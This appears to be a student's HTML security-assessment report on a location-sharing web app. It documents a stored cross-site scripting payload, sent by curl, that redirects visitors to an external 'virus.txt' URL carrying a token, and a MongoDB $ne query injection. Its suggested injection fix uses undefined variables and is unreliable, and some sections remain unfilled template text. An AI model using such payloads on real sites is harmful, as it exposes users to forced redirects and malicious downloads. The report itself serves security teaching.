<!doctype html>
<html>

<head>
<title>Assignment 4</title>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width; initial-scale=1.0;" />
<link href="style.css" rel="stylesheet" />
</head>

<body>
<header>
<h1 id="pg-title">Assignment 4: Security</h1>
</header>

<h3>Introduction</h3>
<p>The product is a web application that upon visiting, displays a google map of the user's location and the locations of nearby users and landmarks within a mile. I was hired to identify security vulnerabilities of the application.</p>

<h3>Methodology</h3>
<p>To test, I wrote practice scripts in a scrap html file, used curl to send purposefully untrustworthy data to the server, and managed the manually inserted test entries from the mLab website.</p>

<h3>Abstract of Findings</h3>
<p>(Provide an overview of all the security and privacy issues you identified. This section should be written for non-technical managers who do not have technical expertise and do not have time to read the entire document. Write this section using lay language.)</p>

<h3>Issues Found</h3>
<ol>
<li>Issue: Cross-site scripting
	<ul>
	<li>Location of issue: Parsing post parameters sent to server (index.js line 90)</li>
	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below.</li>
	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, when I send the following to the server:
		<p><pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre></p>
	accessing <a href="https://stark-journey-75501.herokuapp.com/">https://stark-journey-75501.herokuapp.com/</a> will cause an automatic redirect to opening the file "virus.txt" in the browser. If the file was a .exe file instead, or any file that's automatically downloaded if it can't be opened in a browser window, serious harm could be caused.
	</li>
	<li>Proof of vulnerability:
		<p><img src="examples/xss-data.png" alt="storage of untrusted data in mongodb logins database" /></p>
		<p><img src="examples/xss-redirect.png" alt="redirected page due to cross-site script" /></p>
	</li>
	<li>Resolution: This issue can be alleviated by removing all special characters from the string login input by replacing index.js line 90 with:
		<p><pre>var login = request.body.login.replace(/[^\w\s]/gi, '');</pre></p>
	Another solution that preserves the special characters is to html encode the string login input before storing in the database, which can be done with the npm htmlencode package detailed <a href="https://www.npmjs.com/package/htmlencode">here</a>.</li>
	</ul>
</li>
<br>
<li>Issue: Injection
	<ul>
	<li>Location of issue: Finding entries that match the login GET parameter to /checkins.json (index.js line 69)</li>
	<li>Severity of issue: Low, only because the application already allows access to all the login entries elsewhere in the app</li>
	<li>Description of issue: The login parameter is directly entered as a search query to the mongodb database. Thus, query operators such as the "not equal" ($ne) operator may be entered and applied so checkins.json returns all the entries not equal to the search query rather than only searching for the query as intended.
		<p>With the way the app is set up now, the issue does not have much impact, since all the login entries are returned anyway at the '/' homepage. However, it is still important to remove the user's ability to access data on other users to which they should not be privy, in case the app is further developed in a way that information on all users is no longer willingly released.</p></li>
	<li>Proof of vulnerability:</li>
		<p><img src="examples/search-noops.png" alt="checkins.json search results for query 'jingqi' without operators returns nothing" /></p>
		<p><img src="examples/search-ops.png" alt="checkins.json search results for query 'jingqi' with not equal operator returns all login entries in database" /></p>
	<li>Resolution: Instead of directory passing the query from the GET request to the find function, each entry's login in the database should be compared to the GET request query so no operators will be called. For example, changing index.js lines 69-75 to:
		<p><pre>
		<br>coll.find().toArray(function (err, checkins) {
		<br>    if (!err) {
		<br>    var userlogins = [];
		<br>    for (var i = 0; i < results.length; i++)
		<br>        if (login == checkins[i].login)
		<br>            userlogins.push(checkins[i]);
		<br>    res.send(logins);
		</pre></p>
	</li>
	</ul>
</li>
<br>
<li>Issue:
	<ul>
	<li>Location of issue:</li>
	<li>Severity of issue:</li>
	<li>Description of issue:</li>
	<li>Proof of vulnerability:</li>
	<li>Resolution:</li>
	</ul>
</li>
</ol>

<h3>Conclusion</h3>
<p>Clearly, you can never trust user input, so if the application needs to take in user input, safeguards are necessary to strip it of danger.</p>

<h3>References</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2013-Top_10">https://www.owasp.org/index.php/Top_10_2013-Top_10</a></li>
</ul>

</body>

</html>